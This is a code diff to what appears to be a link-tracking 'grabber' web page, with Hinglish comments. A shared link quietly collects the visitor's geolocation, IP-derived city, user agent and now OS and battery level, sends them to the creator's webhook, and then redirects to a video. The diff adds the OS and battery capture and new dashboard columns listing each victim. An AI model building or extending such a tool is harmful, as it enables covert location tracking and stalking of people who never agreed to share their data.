@@ -323,6 +323,8 @@
                         <tr>
                             <th>Name</th>
                             <th>IP Address</th>
+                            <th>Device/OS</th>
+                            <th>Battery</th>
                             <th>Location</th>
                             <th>Time</th>
                             <th>Action</th>
@@ -348,7 +350,7 @@
         // Aapko apni location details receive karne ke liye ek 'Webhook' ya API ki zarurat hogi.
         // Aap 'https://webhook.site' se ek URL le kar yahan paste kar sakte hain.
         // Jab koi aapka link kholega, uski details is URL par bhej di jayengi.
-        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Yahan apna Webhook URL daalein!
+        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Yahan apna Webhook URL daalein! (e.g., "https://webhook.site/your-unique-id")
 
         // --- UI Control Functions ---
         function showSection(id, btn) {
@@ -425,7 +427,7 @@
                     const config = JSON.parse(decodeURIComponent(escape(atob(dataEncoded))));
 
                     document.getElementById('main-ui').style.display = 'none';
-                    if (document.querySelector('.sidebar')) document.querySelector('.sidebar').style.display = 'none';
+                    document.getElementById('sidebar').style.display = 'none';
                     document.getElementById('admin-dashboard').style.display = 'none';
                     document.getElementById('redirect-ui').classList.remove('hidden');
                     document.getElementById('redirect-header').innerText = config.m;
@@ -436,14 +438,34 @@
                         redirect_url: targetUrl,
                         timestamp: new Date().toISOString(),
                         userAgent: navigator.userAgent,
+                        os: getOS(),
+                        battery: 'N/A',
                         ip: 'Unknown', city: 'Unknown', lat: null, lon: null
                     };
+
+                    function getOS() {
+                        const ua = navigator.userAgent;
+                        if (/Android/i.test(ua)) return "Android";
+                        if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+                        if (/Windows/i.test(ua)) return "Windows";
+                        if (/Mac/i.test(ua)) return "macOS";
+                        if (/Linux/i.test(ua)) return "Linux";
+                        return "Unknown";
+                    }
+
+                    async function captureBattery() {
+                        if (navigator.getBattery) {
+                            const battery = await navigator.getBattery();
+                            visitorData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌' : '🔋'})`;
+                        }
+                    }
 
                     const finalRedirect = (delay = 2500) => { // Default delay 2.5 seconds
                         setTimeout(() => { window.location.href = targetUrl; }, delay);
                     };
 
-                    const collectAndSend = (geoData) => {
+                    const collectAndSend = async (geoData) => {
+                        await captureBattery();
                         // Try IP Provider 1 (ipapi.co)
                         fetch('https://ipapi.co/json/')
                             .then(res => res.json())
@@ -544,6 +566,8 @@
                 const row = `<tr>
                     <td>${log.link_label}</td>
                     <td>${log.ip}</td>
+                    <td>${log.os || 'Unknown'}</td>
+                    <td>${log.battery || 'N/A'}</td>
                     <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'Location data missing\')'}" style="text-decoration: underline; color: var(--primary);">${log.city || 'Unknown'} (${log.country_name || 'N/A'})</td>
                     <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
                     <td><a href="${log.redirect_url}" target="_blank" class="watch-btn">Watch Video</a></td>
